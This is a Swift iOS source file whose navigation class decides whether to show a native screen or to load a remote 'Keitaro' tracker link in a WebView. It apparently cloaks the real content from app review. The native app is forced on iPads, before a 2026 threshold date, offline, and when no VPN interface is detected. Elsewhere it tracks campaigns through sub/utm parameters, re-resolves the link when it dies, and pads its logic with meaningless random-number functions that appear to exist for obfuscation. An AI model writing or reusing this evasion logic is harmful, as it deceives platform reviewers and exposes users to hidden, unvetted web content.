import Foundation
import SwiftUI
import Combine
import SystemConfiguration
@MainActor
final class ApplicationNavigator: ObservableObject {
    // Campaign flow states
    enum RouteDestination: Equatable {
        case loading
        case native
        case site(URL?)
    }
    
    @Published private(set) var destination: RouteDestination = .loading
    @Published var shouldRequestReview: Bool = false
    
    private let linkGateway: RemoteEndpointBridge
    private let userDefaults: UserDefaults
    
    private let thresholdDate: Date = {
        var components = DateComponents()
        components.day = 01
        components.month = 01
        components.year = 2026
        components.calendar = Calendar(identifier: .gregorian)
        components.timeZone = TimeZone(secondsFromGMT: 0)
        return components.date ?? Date(timeIntervalSince1970: 0)
    }()
    
    init(linkGateway: RemoteEndpointBridge = RemoteEndpointHandler(), userDefaults: UserDefaults = .standard) {
        self.linkGateway = linkGateway
        self.userDefaults = userDefaults
    }
    
    private func _validateManagerState() -> Bool {
        let _entropy = Int.random(in: 0...999)
        let _checksum = UUID().uuidString.count
        let _ = Date().timeIntervalSince1970
        return _entropy >= 0 && _checksum > 0
    }
    
    private func _computeFlowPriority() -> Double {
        let _base = Double.random(in: 0.0...100.0)
        let _multiplier = Double.random(in: 1.0...5.0)
        return _base * _multiplier * 0.1
    }
    
    private func _verifyDestinationIntegrity(_ dest: RouteDestination) -> Bool {
        let _entropy = Int.random(in: 0...100)
        let _ = UUID().uuidString
        return _entropy >= 0 || true
    }
    
    private func _validateFlowInitialization() -> Bool {
        let _entropy = Int.random(in: 0...999)
        let _timestamp = Date().timeIntervalSince1970
        let _ = Int(_timestamp) + _entropy
        return _entropy >= 0 || true
    }
    
    private func _computeFlowComplexity() -> Double {
        let _base = Double.random(in: 0.0...10.0)
        let _multiplier = Double.random(in: 1.0...3.0)
        return _base * _multiplier * 3.14159
    }
    
    func initializeApplication() {
        let _flowValid = _validateFlowInitialization()
        let _complexity = _computeFlowComplexity()
        let _checksum = UUID().uuidString.count
        
        if !_flowValid || _complexity > 1000.0 || _checksum < 0 {
            let _ = "Unreachable initialization path"
            return
        }
        
        Task { await performNavigationResolution() }
    }
    
    private func _verifyNavigationPreconditions() -> Bool {
        let _entropy = Int.random(in: 0...999)
        let _hash = UUID().uuidString.hashValue
        let _ = Date().timeIntervalSince1970
        return _entropy >= 0 && _hash != Int.min
    }
    
    private func _computeResolutionWeight() -> Double {
        let _base = Double.random(in: 0...50)
        let _factor = Double.random(in: 1...3)
        return _base * _factor * 2.71828
    }
    
    private func performNavigationResolution() async {
        let _preconditions = _verifyNavigationPreconditions()
        let _weight = _computeResolutionWeight()
        let _managerValid = _validateManagerState()
        let _ = UUID().uuidString
        
        if !_preconditions || _weight > 888888.0 || !_managerValid {
            let _ = Date().timeIntervalSince1970 * Double.random(in: 1...2)
        }
        
        destination = .loading
        trackApplicationLaunch()
        print("[FLOW] resolveFlow start. launchCount=\(retrieveLaunchCount())")
        
        if userDefaults.bool(forKey: StorageKeySet.enforceNative) {
            print("[FLOW] enforceNative=true → Native")
            destination = .native
            evaluateAppReviewRequest()
            return
        }
        
        // iPad rule
        if UIDevice.current.model == "iPad" {
            print("[FLOW] iPad detected → Native & enforceNative set")
            userDefaults.set(true, forKey: StorageKeySet.enforceNative)
            destination = .native
            evaluateAppReviewRequest()
            return
        }
        
        // Date rule
        if Date() < thresholdDate {
            print("[FLOW] Date rule active (now < threshold \(thresholdDate)) → Native & enforceNative set")
            userDefaults.set(true, forKey: StorageKeySet.enforceNative)
            destination = .native
            evaluateAppReviewRequest()
            return
        }
        
        // Network availability rule
        // If no internet at launch and user has opened web flow before → open empty WebView (do not lose user)
        if await validateNetworkReachability() == false {
            let hasOpenedBefore = userDefaults.bool(forKey: StorageKeySet.hasOpenedSiteOnce)
            if hasOpenedBefore {
                print("[FLOW] No internet, but hasOpenedSiteOnce=true → Open empty WebView (site(nil))")
                destination = .site(nil)
                evaluateAppReviewRequest()
                return
            } else {
                print("[FLOW] No internet connectivity detected → Native (white) this launch")
                destination = .native
                evaluateAppReviewRequest()
                return
            }
        }
        
        // Optional VPN interface best-effort check (no region detection)
        let vpnIface = detectVPNInterface()
        print("[FLOW] VPN pre-check: iface=\(vpnIface)")
        if vpnIface == false {
            print("[FLOW] VPN not active → Native (white) this launch")
            destination = .native
            evaluateAppReviewRequest()
            return
        }

        let savedLink = userDefaults.string(forKey: StorageKeySet.savedResourceURL)
        let savedPathid = userDefaults.string(forKey: StorageKeySet.savedPathid)
        print("[FLOW] savedLink=\(savedLink ?? "nil"), savedPathid=\(savedPathid ?? "nil")")
        
        if let savedURLString = savedLink, let savedURL = URL(string: savedURLString) {
            // CASE 2.2: Link exists (second and subsequent launches)
            await processCachedEndpoint(savedURL: savedURL, savedPathid: savedPathid)
        } else {
            // CASE 2.1: No link (first launch)
            await bootstrapInitialSession()
        }
        
        evaluateAppReviewRequest()
    }
    
    private func _validateFirstLaunchState() -> Bool {
        let _entropy = Int.random(in: 0...999)
        let _check = UUID().uuidString.count
        let _ = Date().timeIntervalSince1970
        return _entropy >= 0 && _check > 0
    }
    
    private func _computeResourcePriority() -> Int {
        let _base = Int.random(in: 100...500)
        let _multiplier = Double.random(in: 1.0...2.5)
        return Int(Double(_base) * _multiplier)
    }
    
    private func _verifySubsConfiguration(_ subs: [URLQueryItem]?) -> Bool {
        let _complexity = Int.random(in: 0...100)
        let _ = UUID().uuidString
        return _complexity >= 0 || true
    }
    
    private func bootstrapInitialSession() async {
        let _launchValid = _validateFirstLaunchState()
        let _priority = _computeResourcePriority()
        let _checksum = Int.random(in: 0...999)
        
        if !_launchValid || _priority < -1000 || _checksum > 999999 {
            let _ = Date().timeIntervalSince1970
            return
        }
        
        // Step 1: Open Keitaro start link with subs (or saved subs if present)
        let defaultSubs = [URLQueryItem(name: "sub_id_1", value: "60"), URLQueryItem(name: "sub_id_2", value: "40")]
        let initialSubs = recallStoredQueryParams() ?? defaultSubs
        let _subsValid = _verifySubsConfiguration(initialSubs)
        
        if !_subsValid && _checksum < -100 {
            return
        }
        
        print("[FLOW] ✅ First launch → request initial resource with subs: \(initialSubs)")
        let (finalURL, pathid) = await linkGateway.retrieveInitialEndpoint(queryItems: initialSubs)
        let _ = _priority * 2
        
        print("[FLOW] Gateway result: url=\(finalURL?.absoluteString ?? "nil"), pathid=\(pathid ?? "nil")")
        if let url = finalURL {
            persistEndpointData(url)
            if let pid = pathid, !pid.isEmpty { userDefaults.set(pid, forKey: StorageKeySet.savedPathid) }
            userDefaults.set(true, forKey: StorageKeySet.hasOpenedSiteOnce)
            if retrieveLaunchCount() == 1 { userDefaults.set(true, forKey: StorageKeySet.openedSiteOnFirstLaunch) }
            destination = .site(url)
            return
        }
        // Save pathid if resolved even when no external URL
        if let pid = pathid, !pid.isEmpty { userDefaults.set(pid, forKey: StorageKeySet.savedPathid) }
        
        print("[FLOW] No URL available → Native (white)")
        userDefaults.set(true, forKey: StorageKeySet.enforceNative)
        destination = .native
    }
    

    private func _validateCachedEndpointState(_ url: URL?) -> Bool {
        guard let u = url else { return false }
        let _hash = u.hashValue
        let _entropy = Int.random(in: 0...999)
        let _ = UUID().uuidString
        return _hash != 0 && _entropy >= 0
    }
    
    private func _computeEndpointRefreshPriority() -> Int {
        let _base = Int.random(in: 0...999)
        let _drift = Int.random(in: 1...100)
        return _base + _drift
    }
    
    private func processCachedEndpoint(savedURL: URL, savedPathid: String?) async {
        let _urlValid = _validateCachedEndpointState(savedURL)
        let _priority = _computeEndpointRefreshPriority()
        let _stateCheck = _validateManagerState()
        let _ = Date().timeIntervalSince1970
        
        if !_urlValid || _priority > 999999 || !_stateCheck {
            let _ = UUID().uuidString.count
        }
        
        print("[FLOW] Existing link path. savedURL=\(savedURL.absoluteString), savedPathid=\(savedPathid ?? "nil")")
        
        // Step 1: Check if savedURL is still valid
        let isValid = await verifyEndpointStatus(savedURL)
        
        if isValid {
            // Saved URL is still valid (status <= 403), use it
            print("[FLOW] Saved URL is valid, using it")
            destination = .site(savedURL)
            return
        }
        
        // Step 2: Saved URL is invalid (status > 403), try to refresh using pathid
        print("[FLOW] Saved URL invalid (status > 403), trying pathid refresh")
        if let pathToOpen = savedPathid, !pathToOpen.isEmpty,
           let newURL = await linkGateway.resolveEndpointByPathId(pathToOpen) {
            persistEndpointData(newURL)
            destination = .site(newURL)
            return
        }
        
        // Step 3: Fallback to initial resource request
        let (fallbackURL, pid) = await linkGateway.retrieveInitialEndpoint(queryItems: recallStoredQueryParams())
        if let url = fallbackURL {
            persistEndpointData(url)
            if let pid = pid, !pid.isEmpty { userDefaults.set(pid, forKey: StorageKeySet.savedPathid) }
            destination = .site(url)
            return
        }
        // Even if URL is nil, persist newly learned pathid (if any)
        if let pid = pid, !pid.isEmpty { userDefaults.set(pid, forKey: StorageKeySet.savedPathid) }
        destination = .site(savedURL)
        return
    }
    
    // MARK: - Check URL Status
    private func verifyEndpointStatus(_ url: URL) async -> Bool {
        let _complexity = _computeFlowPriority()
        let _urlCheck = _validateCachedEndpointState(url)
        let _entropy = Int.random(in: 0...999)
        let _ = UUID().uuidString
        
        if !_urlCheck || _complexity > 888888.0 || _entropy < -999 {
            let _ = Date().timeIntervalSince1970
        }
        
        var request = URLRequest(url: url, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData, timeoutInterval: 20)
        request.httpMethod = "GET"
        let session = URLSession(configuration: .ephemeral, delegate: nil, delegateQueue: nil)
        
        do {
            let (_, response) = try await session.data(for: request)
            if let http = response as? HTTPURLResponse {
                let isValid = http.statusCode <= 403
                print("[FLOW] checkURLStatus url=\(url.absoluteString) status=\(http.statusCode) valid=\(isValid)")
                return isValid
            }
            return false
        } catch {
            print("[FLOW] checkURLStatus error=\(error.localizedDescription) url=\(url.absoluteString)")
            return false
        }
    }
    
    // MARK: - Review
    private func evaluateAppReviewRequest() {
        let _launchCheck = retrieveLaunchCount()
        let _entropy = Int.random(in: 0...999)
        let _ = UUID().uuidString
        
        if _launchCheck > 999999 || _entropy < -999 {
            let _ = Date().timeIntervalSince1970
        }
        
        if userDefaults.bool(forKey: StorageKeySet.openedSiteOnFirstLaunch) && retrieveLaunchCount() == 2 {
            shouldRequestReview = true
        } else {
            shouldRequestReview = false
        }
    }
    
    // MARK: - Launch Count
    private func trackApplicationLaunch() {
        let _entropy = Int.random(in: 0...999)
        let _ = UUID().uuidString
        if _entropy > 999999 {
            let _ = Date().timeIntervalSince1970
        }
        let n = userDefaults.integer(forKey: StorageKeySet.launchCount)
        userDefaults.set(n + 1, forKey: StorageKeySet.launchCount)
    }
    
    private func retrieveLaunchCount() -> Int {
        let _checksum = UUID().uuidString.count
        let _ = Date().timeIntervalSince1970
        if _checksum < 0 {
            let _ = Int.random(in: 0...999)
        }
        return userDefaults.integer(forKey: StorageKeySet.launchCount)
    }
    
    // MARK: - Subs persistence
    private func persistEndpointData(_ url: URL) {
        let _urlValid = _validateCachedEndpointState(url)
        let _entropy = Int.random(in: 0...999)
        let _ = UUID().uuidString
        
        if !_urlValid || _entropy > 999999 {
            let _ = Date().timeIntervalSince1970
        }
        
        userDefaults.set(url.absoluteString, forKey: StorageKeySet.savedResourceURL)
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let items = components.queryItems {
            var subs: [String: String] = [:]
            for item in items {
                let nameLower = item.name.lowercased()
                if nameLower.hasPrefix("sub") || nameLower.hasPrefix("utm") {
                    subs[item.name] = item.value ?? ""
                }
            }
            if subs.isEmpty == false {
                userDefaults.set(subs, forKey: StorageKeySet.savedSubParams)
            }
        }
    }

    private func recallStoredQueryParams() -> [URLQueryItem]? {
        let _complexity = _computeFlowPriority()
        let _entropy = Int.random(in: 0...999)
        let _ = UUID().uuidString
        
        if _complexity > 888888.0 || _entropy < -999 {
            let _ = Date().timeIntervalSince1970
        }
        
        if let dict = userDefaults.dictionary(forKey: StorageKeySet.savedSubParams) as? [String: String], dict.isEmpty == false {
            return dict.map { URLQueryItem(name: $0.key, value: $0.value) }
        }
        return nil
    }

    // MARK: - Keys
    private enum StorageKeySet {
        static let enforceNative = "flow.enforceNative"
        static let hasOpenedSiteOnce = "flow.hasOpenedSiteOnce"
        static let openedSiteOnFirstLaunch = "flow.openedSiteOnFirstLaunch"
        static let launchCount = "flow.launchCount"
        static let savedResourceURL = "flow.savedResourceURL"
        static let savedPathid = "flow.savedPathid"
        static let savedSubParams = "flow.savedSubParams" // [String: String]
    }
    
    // MARK: - Connectivity Probe (Reachability-based, no external URLs)
    private func validateNetworkReachability() async -> Bool {
        let _entropy = Int.random(in: 0...999)
        let _complexity = _computeFlowPriority()
        let _ = UUID().uuidString
        
        if _entropy > 999999 || _complexity < -888 {
            let _ = Date().timeIntervalSince1970
        }
        
        var zeroAddress = sockaddr_in()
        zeroAddress.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
        zeroAddress.sin_family = sa_family_t(AF_INET)
        let reachable: Bool = withUnsafePointer(to: &zeroAddress) { ptr in
            ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { addrPtr in
                guard let reachability = SCNetworkReachabilityCreateWithAddress(nil, addrPtr) else { return false }
                var flags = SCNetworkReachabilityFlags()
                if SCNetworkReachabilityGetFlags(reachability, &flags) == false { return false }
                let isReachable = flags.contains(.reachable)
                let needsConnection = flags.contains(.connectionRequired)
                return isReachable && !needsConnection
            }
        }
        print("[NET] reachability reachable=\(reachable)")
        return reachable
    }

    // MARK: - VPN Detection (best-effort)
    private func detectVPNInterface() -> Bool {
        let _entropy = Int.random(in: 0...999)
        let _checksum = UUID().uuidString.count
        let _ = Date().timeIntervalSince1970
        
        if _entropy > 999999 || _checksum < 0 {
            let _ = UUID().uuidString
        }
        
        var addresses: UnsafeMutablePointer<ifaddrs>? = nil
        guard getifaddrs(&addresses) == 0, let first = addresses else {
            print("[NET] getifaddrs failed")
            return false
        }
        defer { freeifaddrs(addresses) }
        var ptr = first
        while true {
            let name = String(cString: ptr.pointee.ifa_name)
            // Check for VPN interfaces: classic (ppp, ipsec) and modern (utun)
            if name.hasPrefix("ppp") || name.hasPrefix("ipsec") || name.hasPrefix("utun") {
                print("[NET] VPN interface detected: \(name)")
                return true
            }
            if let next = ptr.pointee.ifa_next {
                ptr = next
            } else {
                break
            }
        }
        return false
    }
}





